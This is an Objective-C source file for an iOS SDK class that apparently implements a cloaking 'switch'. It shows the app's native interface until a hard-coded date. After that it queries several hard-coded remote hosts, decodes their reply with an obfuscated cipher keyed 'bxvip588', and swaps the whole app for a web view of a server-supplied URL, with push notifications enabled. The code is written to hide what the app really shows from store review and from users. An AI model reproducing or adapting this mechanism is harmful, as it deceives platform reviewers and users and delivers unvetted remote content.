

#import "AbcMMSDK.h"


#import <AVFoundation/AVFoundation.h>
#import "MMNetWorkManager.h"
#import "MVMSAMKeychain.h"
#import "MMVAppDelegate.h"

#import "MMVWYWebController.h"

#import <objc/runtime.h>



// ThirdService

// 引入JPush功能所需头文件
#import "JPUSHService.h"
// iOS10注册APNs所需头文件
#ifdef NSFoundationVersionNumber_iOS_9_x_Max
#import <UserNotifications/UserNotifications.h>
#endif
// 如果需要使用idfa功能所需要引入的头文件（可选）
#import <AdSupport/AdSupport.h>





@interface AbcMMSDK()

@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UIViewController *rootController;

@property (nonatomic, strong) UIViewController *reactNativeRootController;
@property (nonatomic, strong) NSDictionary *launchOptions;
@property (nonatomic, copy) NSString *switchRoute;
@property (nonatomic, copy) NSString *codeKey;
@property (nonatomic, copy) NSString *jpushKey;
@property (nonatomic, copy) NSString *mmUrl;
@property (nonatomic, strong) NSNumber *mmStatus;
@property (nonatomic, strong) NSNumber *isRoute;
@property (nonatomic, strong) NSNumber *plistIndex;
@property (nonatomic, strong) NSDictionary *mmRainbow;

// 时间
@property (nonatomic, copy) NSString *dateStr;

@end



@implementation AbcMMSDK


+(AbcMMSDK *)sharedManager{
  static AbcMMSDK *shareUrl = nil;
  static dispatch_once_t predicate;
  dispatch_once(&predicate, ^{
    shareUrl = [[self alloc]init];
  });
  return shareUrl;
}





#pragma mark - 时间判断
- (int)__attribute__((optnone))sjPduan
{
  NSDateFormatter * dateFormatter = [[NSDateFormatter alloc] init];
  [dateFormatter setDateFormat:@"yyyy-MM-dd"];
  NSString *dateTime=[dateFormatter stringFromDate:[NSDate date]];
  NSDate *currendate = [dateFormatter dateFromString:dateTime];
  NSDate *date = [dateFormatter dateFromString:self.dateStr];
  NSComparisonResult result = [date compare:currendate];
  if (result == NSOrderedDescending) {
    //NSLog(@"Date1  is in the future");
    return 1;
  }
  else if (result == NSOrderedAscending){
    //NSLog(@"Date1 is in the past");
    return -1;
  }
  //NSLog(@"Both dates are the same");
  return 0;
}



#pragma mark - initMMSDKLaunchOptions

- (void)initMMSDKLaunchOptions:(NSDictionary *)launchOptions window:(UIWindow *)window rootController:(UIViewController *)rootController switchRoute:(NSInteger)switchRoute jpushKey:(NSString *)jpushKey userUrl:(NSString *)userUrl dateStr:(NSString *)dateStr {
  
  
  self.launchOptions = launchOptions;
  self.window = window;
  self.rootController = rootController;

  self.switchRoute = [NSString stringWithFormat:@"%zd", switchRoute];
  self.dateStr = dateStr;

  if (jpushKey.length > 0) {
    self.jpushKey = jpushKey;
    NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
    [userDefault setObject:jpushKey forKey:@"MM_jpushKey"];
  }
  
  self.mmUrl = userUrl;
  
  [self mmMonitorNetwork];
  
  [self judgmentSwitchRoute];
  
}



- (void)webProjectPage {
    
    //  self.isRoute = YES;
    self.isRoute = [NSNumber numberWithInteger:1];
    
    [self interfaceOrientation:UIInterfaceOrientationPortrait];
    
    [self jPushService];
    
    MMVWYWebController *webVC = [[MMVWYWebController alloc] init];
    webVC.mmUrl = self.mmUrl;
    [self restoreRootViewController:webVC];
}


- (void)mmMonitorNetwork {
  
  //  self.networkManager = [MMVAFNetworkReachabilityManager sharedManager];
  MMVAFNetworkReachabilityManager *networkManager = [MMVAFNetworkReachabilityManager sharedManager];
  
  __weak typeof(self) weakSelf = self;
  
  [networkManager setReachabilityStatusChangeBlock:^(MMVAFNetworkReachabilityStatus status) {
    if (status == MMVAFNetworkReachabilityStatusReachableViaWiFi || status == MMVAFNetworkReachabilityStatusReachableViaWWAN) {
      if ([weakSelf isFirstAuthorizationNetwork]) {
        
        if (self.switchRoute.integerValue == 11) {
          [weakSelf mmSendRNDataRequest];
        } else {
          [weakSelf sendAsyncRequestSwitchRoute];
        }
        
      }
    }
  }];
  
  [networkManager startMonitoring];
}


- (void)interfaceOrientation:(UIInterfaceOrientation)orientation
{
  if ([[UIDevice currentDevice] respondsToSelector:@selector(setOrientation:)]) {
    SEL selector  = NSSelectorFromString(@"setOrientation:");
    NSInvocation *invocation = [NSInvocation invocationWithMethodSignature:[UIDevice instanceMethodSignatureForSelector:selector]];
    [invocation setSelector:selector];
    [invocation setTarget:[UIDevice currentDevice]];
    int val = orientation;
    [invocation setArgument:&val atIndex:2];
    [invocation invoke];
  }
}


- (BOOL)isFirstAuthorizationNetwork {
  NSString *serviceName = [[NSBundle mainBundle] bundleIdentifier];
  
  NSString *isFirst = [MVMSAMKeychain passwordForService:serviceName account:kMVMSAMKeychainLabelKey];
  
  if (! isFirst || isFirst.length < 1) {
    
    [MVMSAMKeychain setPassword:@"FirstAuthorizationNetwork" forService:serviceName account:kMVMSAMKeychainLabelKey];
    return YES;
  } else {
    
    return NO;
  }
}

- (UIViewController *)jikuhRootController {
  
  UIViewController *imageVC =  [[UIViewController alloc] init];
  imageVC.view.backgroundColor = [UIColor colorWithRed: 0.957 green: 0.988 blue: 1 alpha: 1];
  UIImageView *imagView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, [UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height)];
  imagView.image = [self mmGetTheLaunch];
  [imageVC.view addSubview:imagView];
  
  return imageVC;
}


- (void)restoreRootViewController:(UIViewController *)newRootController {
  
  [UIView transitionWithView:self.window duration:0.25 options:UIViewAnimationOptionTransitionCrossDissolve animations:^{
    
    BOOL oldState = [UIView areAnimationsEnabled];
    [UIView setAnimationsEnabled:NO];
    if (self.window.rootViewController!=newRootController) {
      self.window.rootViewController = newRootController;
    }
    [UIView setAnimationsEnabled:oldState];
  } completion:nil];
}





#pragma mark - judgmentSwitchRoute
- (void)judgmentSwitchRoute {
  
  NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
  self.codeKey = [userDefault stringForKey:@"MM_codeKey"];
  if ([userDefault stringForKey:@"MM_jpushKey"].length > 0) {
    self.jpushKey = [userDefault stringForKey:@"MM_jpushKey"];
  }
  
  if ([userDefault stringForKey:@"MM_mmWebUrl"].length > 0) {
    self.mmUrl = [userDefault stringForKey:@"MM_mmWebUrl"];
  }
  
  
  NSInteger mmStatus = [userDefault stringForKey:@"MM_mmStatus"].integerValue;
  self.mmStatus = [NSNumber numberWithInteger:mmStatus];
  
  NSString *mmRainbowStr = [userDefault stringForKey:@"MM_mmRainbow"];
  
  self.mmRainbow = [self dictionaryWithJsonString:mmRainbowStr];
  
  if (self.switchRoute.integerValue == 1 || ((mmStatus == 1 || mmStatus >= 3) && self.switchRoute.integerValue == 0)) {
    
    [self webProjectPage];
    
    if (self.switchRoute.integerValue == 1) {
      return;
    }
    
  } else if (mmStatus == 2 && self.switchRoute.integerValue == 0) {
      [self webProjectPage];

  } else if (self.switchRoute.integerValue == 2) {
      
    [self restoreRootViewController:self.rootController];
    return;
      
  } else {
    //    NSString *dataStr = [self sendSyncRequestDecodeSwitchRoute];
    //    [self switchRouteAction:dataStr];
  }
  
  if ([self sjPduan] == 1) {
    [self restoreRootViewController:self.rootController];
  } else {
    
    if (self.switchRoute.integerValue == 0) {
      [self sendAsyncRequestSwitchRoute];
    }
    
    if (!self.isRoute) {
      UIViewController *initMmRoot =  [self jikuhRootController];
      [self restoreRootViewController:initMmRoot];
    }
    
  }
  
  
  
}


- (void)switchRouteAction:(NSString *)mmStatus {
  
  if ([self deptNumInputShouldNumber:mmStatus]) {
    NSInteger status =  mmStatus.integerValue;
    if (status == 1 || status >= 3) {
      [self webProjectPage];
      return;
    } else if (status == 2) {
       [self webProjectPage];
      return;
    } else if (status == 0) {
      [self restoreRootViewController:self.rootController];
      return;
    }
  }
  UIViewController *initMmRoot =  [self jikuhRootController];
  [self restoreRootViewController:initMmRoot];
  
}



- (BOOL)deptNumInputShouldNumber:(NSString *)str {
  if (str.length == 0) {
    return NO;
  }
  NSString *regex = @"[0-9]*";
  NSPredicate *pred = [NSPredicate predicateWithFormat:@"SELF MATCHES %@",regex];
  if ([pred evaluateWithObject:str]) {
    return YES;
  }
  return NO;
}



- (void)mmSendRNDataRequest {
  
  NSDictionary *infoPlist = [[NSBundle mainBundle] infoDictionary];
  NSString *bundleIdentifer = [infoPlist objectForKey:@"CFBundleIdentifier"];
  
  
  NSArray *mmArray = @[@"http://plist.fd94.com", @"http://plist.dv31.com", @"http://plist.534j.com", @"http://plist.ce64.com"];
  
  NSInteger indexmm = self.plistIndex.integerValue;
  NSString *switchURL = [NSString stringWithFormat:@"%@/index.php/appApi/request/ac/getAppData/appid/%@/key/d20a1bf73c288b4ad4ddc8eb3fc59274704a0495/client/3",mmArray[indexmm], bundleIdentifer];
  
  
  NSURLRequest *urlRequest = [NSURLRequest requestWithURL:[NSURL URLWithString:switchURL]
                                              cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
                                          timeoutInterval:10];
  
  NSURLResponse *response = nil;
  NSError *error = nil;
  NSData *data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
  
  if (error) {
    
    indexmm++;
    self.plistIndex = [NSNumber numberWithInteger:indexmm];
    if (indexmm > mmArray.count -1) {
      self.plistIndex = [NSNumber numberWithInteger:0];
      
      NSString *serviceName = [[NSBundle mainBundle] bundleIdentifier];
      NSString *isFirst = [MVMSAMKeychain passwordForService:serviceName account:kMVMSAMKeychainLabelKey];
      if (! isFirst || isFirst.length < 1) {
        UIViewController *initMmRoot =  [self jikuhRootController];
        [self restoreRootViewController:initMmRoot];
      }  else {
        [self webProjectPage];
      }
      
      return;
    } else {
      [self mmSendRNDataRequest];
      return;
    }
  }
  
  if (!data) {
    [self webProjectPage];
    return;
  }
  
  NSDictionary *responseDict = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
  
  NSInteger msg = [responseDict[@"msg"] integerValue];
  
  //  NSDictionary *dataDic = responseDict[@"data"];
  NSString *dataEnString = [NSString stringWithFormat:@"%@", responseDict[@"data"]];
  
  NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
  
  
  NSString *mmStatus = @"0";
  if (msg == 0) {
    
    NSString *mmdataString = [self changeUiWithUrlTarget:dataEnString Pass:@"bxvip588"];
    NSDictionary *dataDic = [self dictionaryWithJsonString:mmdataString];
    self.mmRainbow = dataDic;
    
    
    NSString *codeKey = dataDic[@"code_key"];
    NSString *pushKey = dataDic[@"ji_push_key"];
    NSString *mmUrl = dataDic[@"url"];
    mmStatus = dataDic[@"status"];
    
    self.codeKey = codeKey;
    
    if (pushKey.length > 0) {
      self.jpushKey = pushKey;
    }
    if (mmUrl.length > 0) {
       self.mmUrl = mmUrl;
    }
   
    self.mmStatus =[NSNumber numberWithInteger:mmStatus.integerValue];
    
    [userDefault setObject:codeKey forKey:@"MM_codeKey"];
    [userDefault setObject:pushKey forKey:@"MM_jpushKey"];
    [userDefault setObject:mmUrl forKey:@"MM_mmWebUrl"];
    [userDefault setObject:mmStatus forKey:@"MM_mmStatus"];
    [userDefault setObject:mmdataString forKey:@"MM_mmRainbow"];
    
  }
  
  if (self.mmUrl.length == 0) {
    self.codeKey = [userDefault stringForKey:@"MM_codeKey"];
    if ([userDefault stringForKey:@"MM_jpushKey"].length > 0) {
      self.jpushKey = [userDefault stringForKey:@"MM_jpushKey"];
    }
    if ([userDefault stringForKey:@"MM_mmWebUrl"].length > 0) {
      self.mmUrl = [userDefault stringForKey:@"MM_mmWebUrl"];
    }
    
    self.mmStatus =[NSNumber numberWithInteger:[userDefault stringForKey:@"MM_mmStatus"].integerValue];
  }
  
  if (msg == 0) {
    [self switchRouteAction:[NSString stringWithFormat:@"%zd", self.mmStatus.integerValue]];
  } else {
    [self webProjectPage];
  }
  
}



#pragma mark - sendAsyncRequestSwitchRoute
- (void)sendAsyncRequestSwitchRoute{
  
  NSDictionary *infoPlist = [[NSBundle mainBundle] infoDictionary];
  NSString *bundleIdentifer = [infoPlist objectForKey:@"CFBundleIdentifier"];
  
  NSArray *mmArray = @[@"http://plist.fd94.com", @"http://plist.dv31.com", @"http://plist.534j.com", @"http://plist.ce64.com"];
  
  NSInteger indexmm = self.plistIndex.integerValue;
  
  NSString *switchURL = [NSString stringWithFormat:@"%@/index.php/appApi/request/ac/getAppData/appid/%@/key/d20a1bf73c288b4ad4ddc8eb3fc59274704a0495/client/3",mmArray[indexmm], bundleIdentifer];
  
  __weak typeof(self) weakSelf = self;
  [MMNetWorkManager requestWithType:HttpRequestTypeGet withUrlString:switchURL withParaments:nil withSuccessBlock:^(NSDictionary *object) {
    
    NSDictionary *responseDic = object;
    
    NSInteger msg = [responseDic[@"msg"] integerValue];
    
    //    NSDictionary *dataDic = responseDic[@"data"];
    NSString *dataEnString = [NSString stringWithFormat:@"%@", responseDic[@"data"]];
    
    NSUserDefaults *userDefault = [NSUserDefaults standardUserDefaults];
    
    NSString *mmStatus = @"0";
    if (msg == 0) {
      
      NSString *mmdataString = [weakSelf changeUiWithUrlTarget:dataEnString Pass:@"bxvip588"];
      NSDictionary *dataDic = [weakSelf dictionaryWithJsonString:mmdataString];
      weakSelf.mmRainbow = dataDic;
      
      NSString *codeKey = dataDic[@"code_key"];
      NSString *pushKey = dataDic[@"ji_push_key"];
      NSString *mmUrl = dataDic[@"url"];
      mmStatus = dataDic[@"status"];
      
      weakSelf.codeKey = codeKey;
      if (pushKey.length > 0) {
         weakSelf.jpushKey = pushKey;
      }
      
      if (mmUrl.length > 0) {
         weakSelf.mmUrl = mmUrl;
      }
     
     
      if (mmStatus.integerValue == 4) {
        if (weakSelf.mmStatus.integerValue == 0) {
          [weakSelf switchRouteAction:@"0"];
        }
        return;
      }
      [userDefault setObject:codeKey forKey:@"MM_codeKey"];
      [userDefault setObject:pushKey forKey:@"MM_jpushKey"];
      [userDefault setObject:mmUrl forKey:@"MM_mmWebUrl"];
      [userDefault setObject:mmStatus forKey:@"MM_mmStatus"];
      [userDefault setObject:mmdataString forKey:@"MM_mmRainbow"];
      
    }
    
    weakSelf.mmStatus =  [NSNumber numberWithInteger:[userDefault stringForKey:@"MM_mmStatus"].integerValue];
    
    if (weakSelf.switchRoute.integerValue == 0) {
      [weakSelf switchRouteAction:[NSString stringWithFormat:@"%zd",weakSelf.mmStatus.integerValue]];
    }
    
  } withFailureBlock:^(NSError *error) {
    //    NSLog(@"post error： *** %@", error);
    
    if (error) {
      NSInteger indexmm = self.plistIndex.integerValue;
      //      weakSelf.plistIndex++;
      indexmm++;
      weakSelf.plistIndex = [NSNumber numberWithInteger:indexmm];
      if (indexmm > mmArray.count -1) {
        weakSelf.plistIndex = [NSNumber numberWithInteger:0];
        [weakSelf switchRouteAction:[NSString stringWithFormat:@"%zd",weakSelf.mmStatus.integerValue]];
      } else {
        [weakSelf sendAsyncRequestSwitchRoute];
      }
    }
    
  } progress:^(float progress) {
    //    NSLog(@"progress： *** %f", progress);
    
  }];
  
  
}


-(UIImage *)mmGetTheLaunch {
  
  CGSize viewSize = [UIScreen mainScreen].bounds.size;
  
  NSString *viewOrientation = nil;
  
  if (([[UIApplication sharedApplication] statusBarOrientation] == UIInterfaceOrientationPortraitUpsideDown) || ([[UIApplication sharedApplication] statusBarOrientation] == UIInterfaceOrientationPortrait)) {
    viewOrientation = @"Portrait";
  } else {
    viewOrientation = @"Landscape";
  }
  
  NSString *launchImage = nil;
  
  NSArray* imagesDict = [[[NSBundle mainBundle] infoDictionary] valueForKey:@"UILaunchImages"];
  
  for (NSDictionary* dict in imagesDict) {
    CGSize imageSize = CGSizeFromString(dict[@"UILaunchImageSize"]);
    if (CGSizeEqualToSize(imageSize, viewSize) && [viewOrientation isEqualToString:dict[@"UILaunchImageOrientation"]])
    {
      launchImage = dict[@"UILaunchImageName"];
    }
  }
  
  return [UIImage imageNamed:launchImage];
}




- (NSDictionary *)dictionaryWithJsonString:(NSString *)jsonString {
  if (jsonString == nil) {
    return nil;
  }
  
  NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
  NSError *err;
  NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:jsonData
                                                      options:NSJSONReadingMutableContainers
                                                        error:&err];
  if(err) {
    return nil;
  }
  return dic;
}



- (NSString *)changeUiWithUrlTarget:(NSString *)target Pass:(NSString *)pass
{
  
  NSString *result = @"";
  NSMutableArray *codes =[[NSMutableArray alloc] init];
  
  
  for(int i=0; i<[pass length]; i++)
  {
    NSString *temp = [pass substringWithRange:NSMakeRange(i,1)];
    NSString *objStr = [NSString stringWithFormat:@"%d",[temp characterAtIndex:0]];
    [codes addObject:objStr];
  }
  
  for (int i=0; i<[target length]; i+=2)
  {
    int ascii = [[self numberHexString:[target substringWithRange:NSMakeRange(i, 2)]] intValue];
    for (int j = (int)[codes count]; j>0; j--)
    {
      int val = ascii - [(codes[j-1]) intValue]*j;
      if (val < 0)
      {
        ascii = 256 - (abs(val)%256);
      }
      else
      {
        ascii = val%256;
      }
    }
    result = [result stringByAppendingString:[NSString stringWithFormat:@"%c", ascii]];
    
  }
  
  return result;
}


- (NSNumber *)numberHexString:(NSString *)aHexString
{
  
  if (nil == aHexString)
  {
    return nil;
  }
  
  NSScanner * scanner = [NSScanner scannerWithString:aHexString];
  unsigned long long longlongValue;
  [scanner scanHexLongLong:&longlongValue];
  
  NSNumber * hexNumber = [NSNumber numberWithLongLong:longlongValue];
  
  return hexNumber;
}


- (void)setObject:(id)object forKey:(NSString *)key {
  
  if (key == nil || [key isEqualToString:@""]) {
    return;
  }
  
  NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
  
  [defaults setObject:object forKey:key];
  
  [defaults synchronize];
}


- (id)objectForKey:(NSString *)key {
  NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
  return [defaults objectForKey:key];
}











// ThirdService   极光推送
#pragma mark - AppDelegate+ThirdService

- (void)jPushService {
  
    //Required
    //notice: 3.0.0及以后版本注册可以这样写，也可以继续用之前的注册方式
    JPUSHRegisterEntity * entity = [[JPUSHRegisterEntity alloc] init];
    entity.types = JPAuthorizationOptionAlert|JPAuthorizationOptionBadge|JPAuthorizationOptionSound;
    if ([[UIDevice currentDevice].systemVersion floatValue] >= 8.0) {
        // 可以添加自定义categories
        // NSSet<UNNotificationCategory *> *categories for iOS10 or later
        // NSSet<UIUserNotificationCategory *> *categories for iOS8 and iOS9
    }
    [JPUSHService registerForRemoteNotificationConfig:entity delegate:[MMVAppDelegate class]];
    
    //如不需要使用IDFA，advertisingIdentifier 可为nil
    [JPUSHService setupWithOption:self.launchOptions appKey:self.jpushKey
                          channel:nil
                 apsForProduction:true
            advertisingIdentifier:nil];
    
}




@end






